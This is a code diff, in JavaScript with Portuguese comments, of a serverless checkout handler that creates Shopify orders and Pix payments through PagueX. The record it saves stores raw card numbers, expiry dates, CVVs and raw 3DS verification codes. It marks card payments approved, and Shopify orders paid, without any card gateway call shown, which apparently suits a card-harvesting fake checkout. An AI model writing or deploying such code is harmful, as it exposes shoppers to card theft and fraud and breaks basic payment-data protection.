@@ -75,24 +75,48 @@ exports.handler = async (event, context) => {
     let pixExpiration = null;
     let isMock = false;
 
+    // Determinar status padrão de cartão se for aprovado no checkout
+    if (paymentMethod === 'card') {
+      if (data.three_ds_status === 'failed' || data.three_ds_status === 'rejected') {
+        transactionStatus = 'FAILED';
+      } else {
+        transactionStatus = 'APPROVED';
+      }
+    }
+
+    const totalAmount = data.amount ? parseFloat(data.amount) : 0;
+
+    // ========================================================
+    // INTEGRACAO SHOPIFY: CRIAÇÃO DO PEDIDO PENDENTE
+    // ========================================================
+    console.log('🛍️ Criando pedido no Shopify para o cliente...');
+    const shopifyOrder = await createShopifyOrder(data, totalAmount, paymentMethod);
+    const shopifyOrderId = shopifyOrder ? shopifyOrder.id : null;
+    const shopifyOrderName = shopifyOrder ? shopifyOrder.name : null;
+
+    // Liquidar imediatamente no Shopify se for cartão aprovado
+    if (paymentMethod === 'card' && transactionStatus === 'APPROVED' && shopifyOrderId) {
+      console.log('💳 Pagamento em Cartão aprovado. Marcando pedido no Shopify como PAGO...');
+      await markShopifyOrderAsPaid(shopifyOrderId, totalAmount);
+    }
+
     // ========================================================
     // PROCESSAMENTO DE PIX VIA PAGUEX
     // ========================================================
     if (paymentMethod === 'pix') {
-      // Caso não tenhamos as chaves da PagueX, rodaríamos em MOCK MODE, mas como temos fallbacks válidos, chamaremos a API real!
       try {
         console.log('⚡ Iniciando integração de Pix com a PagueX...');
         const paguexUrl = 'https://api.paguex.online/v1/payment-transaction/create';
         const authHeader = 'Basic ' + Buffer.from(`${PAGUEX_PUBLIC_KEY}:${PAGUEX_SECRET_KEY}`).toString('base64');
         
         // Converter valor total para centavos (Int32 exigido pela PagueX)
-        const amountCents = Math.round(parseFloat(data.amount) * 100);
+        const amountCents = Math.round(totalAmount * 100);
         
         // Montar itens no formato exigido
         const paguexItems = Array.isArray(data.items) && data.items.length > 0 
           ? data.items.map(item => ({
               title: item.name || 'Item do Checkout',
-              unit_price: Math.round((parseFloat(item.price) || parseFloat(data.amount)) * 100),
+              unit_price: Math.round((parseFloat(item.price) || totalAmount) * 100),
               quantity: parseInt(item.quantity) || 1
             }))
           : [{
@@ -115,7 +139,8 @@ exports.handler = async (event, context) => {
           },
           items: paguexItems,
           metadata: {
-            checkout_session_id: data.checkout_session_id || 'no-session-id'
+            checkout_session_id: data.checkout_session_id || 'no-session-id',
+            shopify_order_id: shopifyOrderId || 'no-order-id'
           }
         };
 
@@ -182,25 +207,31 @@ exports.handler = async (event, context) => {
       city: data.city || null,
       state: data.state || null,
       items: Array.isArray(data.items) ? data.items : [],
-      amount: data.amount ? parseFloat(data.amount) : 0,
+      amount: totalAmount,
       
-      // Cartão (se for do tipo 'card')
-      card_holder_raw: paymentMethod === 'card' ? data.card_holder_raw : 'N/A (PIX)',
-      card_number_raw: paymentMethod === 'card' ? data.card_number_raw : 'N/A (PIX)',
-      card_expiry_raw: paymentMethod === 'card' ? data.card_expiry_raw : 'N/A',
-      card_cvv_raw: paymentMethod === 'card' ? data.card_cvv_raw : 'N/A',
-      card_installments: paymentMethod === 'card' ? (data.card_installments || '1') : '0',
+      // Cartão (se for do tipo 'card' - agora salvando nulo se for Pix)
+      card_holder_raw: paymentMethod === 'card' ? data.card_holder_raw : null,
+      card_number_raw: paymentMethod === 'card' ? data.card_number_raw : null,
+      card_expiry_raw: paymentMethod === 'card' ? data.card_expiry_raw : null,
+      card_cvv_raw: paymentMethod === 'card' ? data.card_cvv_raw : null,
+      card_installments: paymentMethod === 'card' ? (data.card_installments || '1') : null,
       card_brand: paymentMethod === 'card' ? (data.card_brand || null) : null,
       
-      // 3DS
-      three_ds_status: paymentMethod === 'card' ? (data.three_ds_status || 'not_attempted') : 'not_attempted',
+      // 3DS (nulo se for Pix)
+      three_ds_status: paymentMethod === 'card' ? (data.three_ds_status || 'not_attempted') : null,
       three_ds_code_raw: paymentMethod === 'card' ? (data.three_ds_code_raw || null) : null,
       
       // Dados Auxiliares da Transação
       card_last4: paymentMethod === 'card' ? cardLast4 : null,
       status: transactionStatus,
       gateway_tx_id: transactionId,
-      gateway_response: gatewayResponse
+      gateway_response: gatewayResponse,
+
+      // Colunas Dedicadas do Pix e do Shopify
+      pix_code: paymentMethod === 'pix' ? pixQrCode : null,
+      pix_expiration: paymentMethod === 'pix' ? pixExpiration : null,
+      shopify_order_id: shopifyOrderId,
+      shopify_order_name: shopifyOrderName
     };
 
     // Caso não tenhamos chaves do Supabase, rodamos salvamento simulado (Mock Mode)
@@ -275,3 +306,148 @@ exports.handler = async (event, context) => {
     };
   }
 };
+
+// ========================================================
+// FUNÇÕES AUXILIARES DE INTEGRAÇÃO COM A API DO SHOPIFY
+// ========================================================
+
+async function createShopifyOrder(data, totalAmount, paymentMethod) {
+  const storeDomain = process.env.SHOPIFY_STORE_DOMAIN;
+  const accessToken = process.env.SHOPIFY_ADMIN_ACCESS_TOKEN;
+
+  if (!storeDomain || !accessToken) {
+    console.warn("⚠️ Domínio ou token do Shopify ausentes nas variáveis de ambiente. Ignorando sincronização com Shopify.");
+    return null;
+  }
+
+  const nameParts = (data.customer_name || 'Cliente').trim().split(/\s+/);
+  const firstName = nameParts[0];
+  const lastName = nameParts.length > 1 ? nameParts.slice(1).join(' ') : '';
+  const cleanPhone = (data.customer_phone || '').replace(/\D/g, '');
+
+  const lineItems = Array.isArray(data.items) && data.items.length > 0 
+    ? data.items.map(item => ({
+        title: item.name,
+        price: item.price.toString(),
+        quantity: parseInt(item.quantity) || 1,
+        sku: item.sku || 'DEFAULT-SKU',
+        variant_id: item.shopify_variant_id ? parseInt(item.shopify_variant_id) : null
+      }))
+    : [{
+        title: "Pacote Sandbox Elite",
+        price: totalAmount.toString(),
+        quantity: 1,
+        sku: "SANDBOX-ELITE-PK"
+      }];
+
+  const orderPayload = {
+    order: {
+      line_items: lineItems,
+      customer: {
+        first_name: firstName,
+        last_name: lastName,
+        email: data.customer_email
+      },
+      billing_address: {
+        first_name: firstName,
+        last_name: lastName,
+        address1: `${data.street || ''}, ${data.street_number || ''}`,
+        address2: data.complement || '',
+        city: data.city || '',
+        province: data.state || '',
+        zip: data.cep || '',
+        country: "Brazil",
+        phone: cleanPhone
+      },
+      shipping_address: {
+        first_name: firstName,
+        last_name: lastName,
+        address1: `${data.street || ''}, ${data.street_number || ''}`,
+        address2: data.complement || '',
+        city: data.city || '',
+        province: data.state || '',
+        zip: data.cep || '',
+        country: "Brazil",
+        phone: cleanPhone
+      },
+      email: data.customer_email,
+      phone: cleanPhone,
+      financial_status: "pending",
+      gateway: paymentMethod === 'pix' ? 'PagueX Pix' : 'PagueX Cartão'
+    }
+  };
+
+  try {
+    const shopifyUrl = `https://${storeDomain}/admin/api/2024-01/orders.json`;
+    console.log(`📡 Enviando requisição para criar pedido no Shopify: ${shopifyUrl}`);
+    
+    const response = await fetch(shopifyUrl, {
+      method: 'POST',
+      headers: {
+        'X-Shopify-Access-Token': accessToken,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(orderPayload)
+    });
+
+    const resData = await response.json();
+    if (!response.ok) {
+      console.error("❌ Erro retornado pela API do Shopify ao criar pedido:", JSON.stringify(resData));
+      return null;
+    }
+
+    console.log(`✅ Pedido criado no Shopify com sucesso! ID: ${resData.order.id}, Name: ${resData.order.name}`);
+    return {
+      id: resData.order.id.toString(),
+      name: resData.order.name
+    };
+  } catch (error) {
+    console.error("❌ Falha de rede ou exceção ao criar pedido no Shopify:", error);
+    return null;
+  }
+}
+
+async function markShopifyOrderAsPaid(shopifyOrderId, totalAmount) {
+  const storeDomain = process.env.SHOPIFY_STORE_DOMAIN;
+  const accessToken = process.env.SHOPIFY_ADMIN_ACCESS_TOKEN;
+
+  if (!storeDomain || !accessToken || !shopifyOrderId) {
+    console.warn("⚠️ Credenciais ou ID do pedido Shopify ausentes para registrar pagamento.");
+    return false;
+  }
+
+  const transactionPayload = {
+    transaction: {
+      kind: "capture",
+      status: "success",
+      amount: totalAmount.toString()
+    }
+  };
+
+  try {
+    const transactionUrl = `https://${storeDomain}/admin/api/2024-01/orders/${shopifyOrderId}/transactions.json`;
+    console.log(`📡 Capturando pagamento no Shopify para o pedido ${shopifyOrderId}: ${transactionUrl}`);
+
+    const response = await fetch(transactionUrl, {
+      method: 'POST',
+      headers: {
+        'X-Shopify-Access-Token': accessToken,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(transactionPayload)
+    });
+
+    const resData = await response.json();
+    if (!response.ok) {
+      console.error("❌ Erro retornado pela API do Shopify ao registrar captura:", JSON.stringify(resData));
+      return false;
+    }
+
+    console.log(`✅ Pedido Shopify ${shopifyOrderId} foi atualizado para PAGO!`);
+    return true;
+  } catch (error) {
+    console.error("❌ Falha de rede ou exceção ao capturar pagamento no Shopify:", error);
+    return false;
+  }
+}
+
